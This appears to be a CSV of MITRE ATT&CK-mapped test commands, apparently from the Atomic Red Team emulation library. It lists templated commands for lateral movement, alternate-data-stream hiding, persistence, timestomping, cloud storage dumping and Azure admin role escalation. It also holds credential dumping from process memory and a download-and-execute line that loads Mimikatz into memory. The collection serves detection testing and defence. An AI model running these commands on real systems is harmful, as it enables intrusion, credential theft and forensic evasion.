mitre_id,technique_name,command
T1133,Running Chrome VPN Extensions via the Registry 2 vpn extension,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1021,Map admin share,"cmd.exe /c ""net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"""
T1021,Map Admin Share PowerShell,new-psdrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
T1021,Copy and Execute File with PsExec,"""#{psexec_exe}"" #{remote_host} -accepteula -c #{command_path}"
T1021,Execute command writing output to local Admin Share,cmd.exe /q /c #{command_to_execute} 1> \\127.0.0.1\admin$\#{output_file} 2>&1
T1564,Alternate Data Streams (ADS),"type c:\temp\evil.exe > ""c:\program files (x86)\teamviewer\teamviewer12_logfile.log:evil.exe"" extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe findstr /v /l w3alllov3donaldtrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1564.004/src/test.ps1 c:\temp:ttt makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab print /d:#{path}\file.txt:autoruns.exe #{path}\autoruns.exe reg export hklm\software\microsoft\evilreg #{path}\file.txt:evilreg.reg regedit /e #{path}\file.txt:regfile.reg hkey_current_user\mycustomregkey expand \\webdav\folder\file.bat #{path}\file.txt:file.bat esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o"
T1564,Store file in Alternate Data Stream (ADS),"if (!(test-path c:\users\public\libraries\yanki -pathtype container)) { new-item -itemtype directory -force -path c:\users\public\libraries\yanki } start-process -filepath ""$env:comspec"" -argumentlist ""/c,type,#{payload_path},>,`""#{ads_file_path}:#{ads_name}`"""""
T1564,Create ADS command prompt,"echo cmd /c echo ""shell code execution.""> #{file_name}:#{ads_filename} for /f ""usebackq delims=?"" %i in (#{file_name}:#{ads_filename}) do %i"
T1564,Create ADS PowerShell,"echo ""test"" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value ""test"" set-content -path #{file_name} -stream #{ads_filename} -value ""test2"" set-content -path . -stream #{ads_filename} -value ""test3"""
T1564,Create Hidden Directory via $index_allocation,md #{folder_name} echo too many secrets > #{folder_name}\#{hidden_filename}
T1090,Connection Proxy,export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port} curl #{test_url}
T1090,Connection Proxy for macOS UI,networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port} networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
T1090,portproxy reg key,netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}
T1654,Get-EventLog To Enumerate Windows Security Log,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1654,Enumerate Windows Security Log via WevtUtil,wevtutil enum-logs
T1047,WMI Reconnaissance Users,wmic useraccount get /all /format:csv
T1047,WMI Reconnaissance Processes,"wmic process get caption,executablepath,commandline /format:csv"
T1047,WMI Reconnaissance Software,"wmic qfe get description,installedon /format:csv"
T1047,WMI Reconnaissance List Remote Services,"wmic /node:""#{node}"" service where (caption like ""%#{service_search_string}%"")"
T1047,WMI Execute Local Process,wmic process call create #{process_to_execute}
T1047,WMI Execute Remote Process,"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process call create #{process_to_execute}"
T1047,Create a Process using WMI Query and an Encoded Command,powershell -exec bypass -e sqbuahyabwbragualqbxag0aaqbnaguadaboag8azaagac0auabhahqaaaagahcaaqbuadmamgbfahaacgbvagmazqbzahmaiaatae4ayqbtaguaiabjahiazqbhahqazqagac0aqqbyagcadqbtaguabgb0aewaaqbzahqaiabuag8adablahaayqbkac4azqb4agua
T1047,Create a Process using obfuscated Win32_Process,"$class = new-object management.managementclass(new-object management.managementpath(""win32_process"")) $newclass = $class.derive(""#{new_class}"") $newclass.put() invoke-wmimethod -path #{new_class} -name create -argumentlist #{process_to_execute}"
T1047,WMI Execute rundll32,"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}"""
T1047,Application uninstall using WMIC,"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall"
T1547,Shortcut Modification,echo [internetshortcut] > #{shortcut_file_path} echo url=c:\windows\system32\calc.exe >> #{shortcut_file_path} #{shortcut_file_path}
T1547,Create shortcut to cmd in startup folders,"$shell = new-object -comobject (""wscript.shell"") $shortcut = $shell.createshortcut(""$env:appdata\microsoft\windows\start menu\programs\startup\t1547.009.lnk"") $shortcut.targetpath=""cmd.exe"" $shortcut.workingdirectory = ""c:\windows\system32""; $shortcut.windowstyle = 1; $shortcut.description = ""t1547.009.""; $shortcut.save() $shell = new-object -comobject (""wscript.shell"") $shortcut = $shell.createshortcut(""$env:programdata\microsoft\windows\start menu\programs\startup\t1547.009.lnk"") $shortcut.targetpath=""cmd.exe"" $shortcut.workingdirectory = ""c:\windows\system32""; $shortcut.windowstyle = 1; $shortcut.description = ""t1547.009.""; $shortcut.save()"
T1546,Trap EXIT,"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" exit'"
T1546,Trap EXIT (freebsd),"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" exit'"
T1546,Trap SIGINT,"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" sigint && kill -sigint $$'"
T1546,Trap SIGINT (freebsd),"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" sigint && kill -sigint $$'"
T1546,Application Shim Installation,"sdbinst.exe ""#{file_path}"""
T1546,New shim database files created in the default shim database directory,"copy-item ""$pathtoatomicsfolder\t1546.011\bin\t1546.011compatdatabase.sdb"" c:\windows\apppatch\custom\t1546.011compatdatabase.sdb copy-item ""$pathtoatomicsfolder\t1546.011\bin\t1546.011compatdatabase.sdb"" c:\windows\apppatch\custom\custom64\t1546.011compatdatabase.sdb"
T1546,Registry key creation and/or modification events for SDB,"new-itemproperty -path hklm:""\software\microsoft\windows nt\currentversion\appcompatflags\custom"" -name ""atomicredteamt1546.011"" -value ""atomicredteamt1546.011"" new-itemproperty -path hklm:""\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb"" -name ""atomicredteamt1546.011"" -value ""atomicredteamt1546.011"""
T1114,Email Collection with PowerShell Get-Inbox,"powershell -executionpolicy bypass -command ""#{file_path}\get-inbox.ps1"" -file #{output_file}"
T1620,WinPwn - Reflectively load Mimik@tz into memory,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive
T1003,Dump individual process memory with sh (Local),"sh #{script_path} pid=$(pgrep -n -f ""#{pid_term}"") heap_mem=$(grep -e ""^[0-9a-f-]* r"" /proc/""$pid""/maps | grep heap | cut -d' ' -f 1) mem_start=$(echo $((0x$(echo ""$heap_mem"" | cut -d""-"" -f1)))) mem_stop=$(echo $((0x$(echo ""$heap_mem"" | cut -d""-"" -f2)))) mem_size=$(echo $((0x$mem_stop-0x$mem_start))) dd if=/proc/""${pid}""/mem of=""#{output_file}"" ibs=1 skip=""$mem_start"" count=""$mem_size"" grep -i ""pass"" ""#{output_file}"""
T1003,Dump individual process memory with sh on FreeBSD (Local),"sh #{script_path} pid=$(pgrep -n -f ""#{pid_term}"") mem_start=$(head -n 5 /proc/""${pid}""/map | tail -1 | cut -d' ' -f1) mem_stop=$(head -n 5 /proc/""${pid}""/map | tail -1 | cut -d' ' -f2) mem_size=$(echo $(($mem_stop-$mem_start))) dd if=/proc/""${pid}""/mem of=""#{output_file}"" ibs=1 skip=""$mem_start"" count=""$mem_size"" strings ""#{output_file}"" | grep -i pass"
T1003,Dump individual process memory with Python (Local),"sh #{script_path} pid=$(pgrep -n -f ""#{pid_term}"") python=$(which python || which python3 || which python2) $python #{python_script} $pid #{output_file} grep -i ""pass"" ""#{output_file}"""
T1003,Capture Passwords with MimiPenguin,sudo #{mimipenguin_location} > #{output_file} cat #{output_file}
T1016,Check internet connection using ping Windows,ping -n 4 #{ping_target}
T1016,"Check internet connection using ping freebsd, linux or macos",ping -c 4 #{ping_target}
T1016,Check internet connection using Test-NetConnection in PowerShell (ICMP-Ping),test-netconnection -computername #{target}
T1016,Check internet connection using Test-NetConnection in PowerShell (TCP-HTTP),test-netconnection -commontcpport http -computername #{target}
T1016,Check internet connection using Test-NetConnection in PowerShell (TCP-SMB),test-netconnection -commontcpport smb -computername #{target}
T1037,Logon Scripts,"echo ""#{script_command}"" > #{script_path} reg.exe add hkcu\environment /v userinitmprlogonscript /t reg_sz /d ""#{script_path}"" /f"
T1546,Persistance with Event Monitor - emond,"sudo cp ""#{plist}"" /etc/emond.d/rules/t1546.014_emond.plist sudo touch /private/var/db/emondclients/t1546.014"
T1547,Add a driver,"pnputil.exe /add-driver ""#{driver_inf}"""
T1547,Driver Installation Using pnputil.exe,pnputil.exe -i -a #{driver_path}
T1547,Leverage Virtual Channels to execute custom DLL during successful RDP session,"reg add ""hkey_current_user\software\microsoft\terminal server client\default\addins\#{subkey_added}"" /v name /t reg_sz /d ""#{dll_inf}"" /f"
T1055,Thread Execution Hijacking,"$notepad = start-process notepad -passthru start-process ""$pathtoatomicsfolder\t1055.003\bin\injectcontext.exe"" start-sleep -seconds 5 stop-process $notepad.id"
T1070,Set a file's access timestamp,touch -a -t 197001010000.00 #{target_filename}
T1070,Set a file's modification timestamp,touch -m -t 197001010000.00 #{target_filename}
T1070,Set a file's creation timestamp,"now=$(date +%m%d%h%m%y) date 010100001971 touch #{target_filename} date ""$now"" stat #{target_filename}"
T1070,Modify file timestamps using reference file,touch #{target_file_path} touch -acmr #{reference_file_path} #{target_file_path}
T1070,Windows - Modify file creation timestamp with PowerShell,"get-childitem ""#{file_path}"" | % { $_.creationtime = ""#{target_date_time}"" }"
T1070,Windows - Modify file last modified timestamp with PowerShell,"get-childitem ""#{file_path}"" | % { $_.lastwritetime = ""#{target_date_time}"" }"
T1070,Windows - Modify file last access timestamp with PowerShell,"get-childitem ""#{file_path}"" | % { $_.lastaccesstime = ""#{target_date_time}"" }"
T1070,Windows - Timestomp a File,"import-module ""#{file_path}\timestomp.ps1"" timestomp -dest ""#{file_path}\kxwn.lock"""
T1070,MacOS - Timestomp Date Modified,setfile -m #{target_date} #{target_filename}
T1070,Event Log Manipulations- Time slipping via Powershell,"try{ set-date -date (get-date).adddays(#{days_to_modify}) add-content ""$env:appdata\slipdays.bak"" #{days_to_modify} } catch {exit 1}"
T1530,AWS - Scan for Anonymous Access to S3,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}
T1530,Azure - Dump Azure Storage Account Objects via Azure CLI,"$storage_account_objects = import-csv -path ""#{storage_account_objects_csv_file_path}"" # login to azure az login if (-not (test-path -path ""#{output_folder}"")) { new-item -itemtype directory -path ""#{output_folder}"" } foreach ($row in $storage_account_objects) { if ($row.filesharename -ne """"){ $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching content from file share: $($row.filesharename) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for file share content $filesharepath = join-path -path $storageaccountoutputpath $row.filesharename if (-not (test-path -path $filesharepath)) { new-item -itemtype directory -path $filesharepath } az storage file download-batch --connection-string $connectionstring --source $row.filesharename --destination $filesharepath } } elseif ($row.containername -ne """" -and $row.blobname -eq """") { $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching all blobs from container $($row.containername) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for blob content $containerfolderpath = join-path $storageaccountoutputpath $row.containername if (-not (test-path -path $containerfolderpath)) { new-item -itemtype directory -path $containerfolderpath } az storage blob download-batch --destination $containerfolderpath --source $row.containername --connection-string $connectionstring } } }"
T1098,Azure AD - Add Company Administrator Role to a user,"import-module msonline $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-msolservice -credential $credential add-msolrolemember -rolename ""company administrator"" -rolememberemailaddress ""#{target_user}"""
